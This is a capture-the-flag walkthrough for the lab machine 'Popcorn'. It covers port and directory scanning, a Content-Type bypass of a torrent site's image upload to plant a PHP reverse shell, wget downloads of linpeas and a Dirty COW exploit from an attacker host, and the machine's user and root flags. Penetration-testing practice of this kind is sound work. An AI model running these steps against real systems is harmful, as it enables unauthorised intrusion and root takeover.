# Popcorn - Medium

```shell
sudo vim /etc/hosts
#add popcorn.htb

nmap -T4 -p- -A -Pn -v popcorn.htb

gobuster dir -u http://popcorn.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

searchsploit torrent hoster
#finds exploit

#upload torrent
#modify screenshot
#intercept using Burp Suite and modify Content-Type

nc -nvlp 4444
#we get reverse shell

which python

python -c 'import pty;pty.spawn("/bin/bash")'

#get linpeas from attacker server
cd /tmp

wget http://10.10.14.4:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#shows many kernel exploits
#run dirty cow exploit

wget http://10.10.14.4:8000/dirty.c

which gcc

gcc -pthread dirty.c -o dirty -lcrypt

./dirty
#creates new user
#takes some time

su firefart
#use password

id
#root
```

* Open ports & services:

  * 22 - ssh - OpenSSH 5.1p1 (Ubuntu)
  * 80 - http - Apache httpd 2.2.12

* Now, the webpage on port 80 does not show anything useful; it just informs that the web server works.

* We can check for hidden directories using ```gobuster``` - it finds the following directories:

  * /test
  * /torrent
  * /rename

* /test page contains phpinfo() - reading through shows the page is using ```PHP v5.2.10-2ubuntu6.10```, 'document_root' is ```/var/www```, and 'file_uploads' is enabled.

* /torrent leads to 'Torrent Hoster', and this is related to torrenting software.

* /rename page shows syntax for 'Renamer API'; it might come in handy later:

```index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name```

* Now, we can use 'Register' to create an account in 'Torrent Hoster', and login to explore the site.

* We have an option to upload torrents as well.

* Using ```searchsploit```, we can see that there is a file upload exploit in this software.

* When we try to upload a PHP reverse shell by navigating to '/torrent/torrents.php?mode=upload', it detects invalid file type.

* However, we are able to upload genuine .torrent files.

* After upload, we have an option to edit the torrent screenshots by uploading image files - we can attempt to upload reverse shell here.

* While we are unable to upload .php files, we can attempt to use double extensions by uploading .jpg.php files - this is also invalid.

* To check the filters being used, we can intercept the request using ```Burp Suite```, and forward it to Repeater.

* We are able to upload genuine .jpg files here, and these uploads can be checked in /torrent/upload directory.

* To attempt image filter evasion, we need to modify fields such as 'Content-Type', 'filename with extension' and 'magic bytes'.

* On changing the 'Content-Type' to 'image/jpg', we are able to upload the file 'reverse-shell.jpg.php'.

* Now, we can setup a listener and access the uploaded file in /torrent/upload - this gives us a reverse shell.

* We can begin enumeration process by checking common directories, followed by running ```linpeas```.

* ```linpeas``` shows multiple possible kernel exploits - we can attempt running the ```dirty_cow``` exploit (CVE-2016-5195).

* We can run this exploit by transferring 'dirty.c' to the victim machine; compile & run the exploit.

* After a while, we can switch to the newly-created user - we get root shell now.

```markdown
1. User flag - d02cd94d9e24dc22dd7e0d06e8fa0ad3

2. Root flag - b0a299a792ac649b9f2c2648bc68c13f
```
